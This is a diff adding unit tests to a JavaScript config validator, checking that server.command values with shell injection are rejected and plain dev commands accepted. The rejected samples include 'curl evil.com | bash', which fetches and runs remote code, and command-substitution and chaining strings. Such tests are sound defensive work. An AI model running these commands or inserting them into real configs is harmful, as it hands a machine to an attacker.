@@ -201,6 +201,36 @@ describe('validateConfig', () => {
     const result = validateConfig({ server: { staticDir: 'public' } });
     assert.strictEqual(result.server.staticDir, 'public');
   });
+
+  it('should reject server.command with shell injection characters', () => {
+    assert.throws(
+      () => validateConfig({ server: { command: 'curl evil.com | bash' } }),
+      ConfigError
+    );
+    assert.throws(
+      () => validateConfig({ server: { command: 'echo $(whoami)' } }),
+      ConfigError
+    );
+    assert.throws(
+      () => validateConfig({ server: { command: 'cmd1; cmd2' } }),
+      ConfigError
+    );
+    assert.throws(
+      () => validateConfig({ server: { command: 'cmd1 & cmd2' } }),
+      ConfigError
+    );
+  });
+
+  it('should accept safe server.command values', () => {
+    const result1 = validateConfig({ server: { command: 'npm run dev' } });
+    assert.strictEqual(result1.server.command, 'npm run dev');
+
+    const result2 = validateConfig({ server: { command: 'next dev --port 3000' } });
+    assert.strictEqual(result2.server.command, 'next dev --port 3000');
+
+    const result3 = validateConfig({ server: { command: '' } });
+    assert.strictEqual(result3.server.command, '');
+  });
 });
 
 describe('migrateConfig', () => {
